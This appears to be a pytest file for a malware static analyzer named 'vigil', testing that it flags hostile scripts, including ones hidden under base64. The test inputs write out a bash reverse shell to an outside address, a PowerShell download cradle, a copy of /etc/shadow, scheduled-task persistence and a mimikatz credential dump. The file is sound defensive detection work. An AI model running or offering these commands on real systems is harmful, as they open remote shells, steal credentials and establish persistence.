import base64

from vigil.deobfuscator import deobfuscate
from vigil import static_analyzer as sa


def analyze(text):
    return sa.analyze(deobfuscate(text), use_yara=False)


def names(result):
    return {f.name for f in result.findings}


def test_detects_reverse_shell():
    r = analyze("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")
    assert "reverse_shell_bash" in names(r)
    assert any(f.category == "c2" for f in r.findings)


def test_detects_powershell_download_cradle():
    r = analyze("IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    assert "powershell_iex" in names(r)
    assert "net_webclient_download" in names(r)


def test_detects_credential_file_access():
    r = analyze("cat /etc/shadow > /tmp/loot")
    assert "unix_credential_files" in names(r)
    assert any(f.attack_id and f.attack_id.startswith("T1003") for f in r.findings)


def test_detects_scheduled_task_persistence():
    r = analyze("schtasks /create /tn evil /tr calc.exe /sc onlogon")
    assert "scheduled_task" in names(r)


def test_findings_carry_layer_provenance():
    payload = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
    blob = base64.b64encode(payload.encode()).decode()
    r = analyze(f"echo {blob} | base64 -d | bash")
    rs = [f for f in r.findings if f.name == "reverse_shell_bash"]
    assert rs
    assert any(f.layer_id > 0 for f in rs)  # found in a decoded layer


def test_matched_string_is_recorded():
    r = analyze("mimikatz sekurlsa::logonpasswords")
    creds = [f for f in r.findings if f.name == "credential_dumping"]
    assert creds
    assert creds[0].matched


def test_benign_script_no_findings():
    r = analyze("#!/bin/bash\necho hello\ndate\nls -la\n")
    assert r.findings == []


def test_degrades_without_yara_with_note():
    # use_yara=True but rules may be absent / yara-python may be missing;
    # either way this must not crash and must still run pattern detection.
    r = sa.analyze(deobfuscate("iex(malicious)"), use_yara=True)
    assert isinstance(r.findings, list)
    if not r.yara_used:
        assert any("pattern detection only" in n for n in r.notes)


def test_hostile_input_does_not_crash():
    for bad in ["", "\x00\x01", "A" * 10000, "%%%", "iex(" * 500]:
        sa.analyze(deobfuscate(bad), use_yara=False)
